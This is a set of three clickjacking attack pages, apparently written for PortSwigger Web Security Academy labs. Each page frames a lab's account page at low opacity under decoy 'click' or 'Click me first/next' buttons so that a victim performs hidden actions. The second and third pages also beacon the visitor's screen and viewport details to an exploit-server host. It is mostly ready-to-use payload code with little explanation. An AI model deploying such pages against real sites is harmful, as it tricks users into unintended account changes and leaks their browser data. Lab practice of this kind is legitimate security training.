CLICKJACKING EXAMPLE:

<style>
iframe {
    position: absolute;
    opacity: 0.4;
    z-index: 2;
}
</style>

<body>
<script>
(function () {
  const width = 50;  
  const height = 20;  
  const cols = Math.ceil(window.innerWidth / width);
  const rows = Math.ceil(window.innerHeight / height);

  for (let y = 0; y < rows; y++) {
    for (let x = 0; x < cols; x++) {
      const el = document.createElement("div");
      el.textContent = "click";

      el.style.position = "absolute";
      el.style.left = (x * width) + "px";
      el.style.top = (y * height) + "px";
      el.style.width = width + "px";
      el.style.height = height + "px";

      el.style.display = "flex";
      el.style.alignItems = "center";
      el.style.justifyContent = "center";

      el.style.background = "rgba(0,0,0,0.1)";
      el.style.cursor = "pointer";
      el.style.zIndex = 1;

      document.body.appendChild(el);
    }
  }
})();
</script>
<iframe 
src="https://0a9f00ea0328b86082131fbd00bc0009.web-security-academy.net/my-account?email=wiener2@gmail.com" 
onload="this.width=screen.width;this.height=screen.height;" 
sandbox="allow-top-navigation allow-forms" id="target_website">
</iframe>
</body>



-------------------------

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

/* Textos */
.overlay {
    position: absolute;
    z-index: 1;

    padding: 10px 20px;
    background: rgba(0,0,0,0.2);

    font-family: Arial;
    font-size: 20px;
    color: black;

    cursor: pointer;
}

/* Iframe */
iframe {
    position: absolute;
    top: 0;
    left: 0;

    width: 100vw;
    height: 100vh;

    border: none;
    opacity: 0.4;
    z-index: 2;
}
</style>

<body>

<script>
fetch(
  "https://exploit-0af900a10336c000802f2ac301560040.exploit-server.net/exploit?resolution="
  + screen.width + "x" + screen.height
);

// Crear texto en X/Y
function addText(text, x, y) {
    const el = document.createElement("div");

    el.className = "overlay";
    el.textContent = text;

    el.style.left = x + "px";
    el.style.top = y + "px";

    document.body.appendChild(el);
}

// Posicionar elementos manualmente
addText("Click me first", 382.5, 551.296875);
addText("Click me next", 549.6875, 316.734375);
</script>

<iframe
    src="https://0ab600aa038cc06180fe2b7f00890066.web-security-academy.net/my-account"
    sandbox="allow-top-navigation allow-forms"
    id="target_website">
</iframe>
<img
  src="https://exploit-0af900a10336c000802f2ac301560040.exploit-server.net/pixel?res=1920x1080"
  style="display:none">
</body>

-----------

<!-- https://portswigger.net/web-security/clickjacking/lab-multistep -->

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

/* Textos */
.overlay {
    position: absolute;
    z-index: 1;

    padding: 10px 20px;
    background: rgba(0,0,0,0.2);

    font-family: Arial;
    font-size: 20px;
    color: black;

    cursor: pointer;
}

/* Iframe */
iframe {
    position: absolute;
    top: 0;
    left: 0;

    width: 100vw;
    height: 100vh;

    border: none;
    opacity: 0.4;
    z-index: 2;
}
</style>

<body>

<script>

// Crear texto en X/Y
function addText(text, x, y) {
    const el = document.createElement("div");

    el.className = "overlay";
    el.textContent = text;

    el.style.left = x + "px";
    el.style.top = y + "px";

    document.body.appendChild(el);
}

(function () {
  const datos = {
    w: screen.width,
    h: screen.height,
    aw: screen.availWidth,
    ah: screen.availHeight,
    vw: window.innerWidth,
    vh: window.innerHeight,
    dpr: window.devicePixelRatio || 1,
    cd: screen.colorDepth
  };

  const qs = Object.entries(datos)
    .map(([k, v]) => k + "=" + encodeURIComponent(v))
    .join("&");

  const img = new Image();
  img.src = "https://exploit-0a88001d034c60e180bb11c7012600f4.exploit-server.net/exploit?" + qs;
})();




setTimeout(()=>{
// Posicionar elementos manualmente

},3000)

addText("Click me first", 10, 490);
addText("Click me next", 170, 290);

</script>

<iframe
    src="https://0ab700fb03d0602c8025124900120093.web-security-academy.net/my-account"
    sandbox="allow-top-navigation allow-forms"
    id="target_website">
</iframe>
<img
  src="https://exploit-0a88001d034c60e180bb11c7012600f4.exploit-server.net/exploit?res=1920x1080"
  style="display:none">
</body>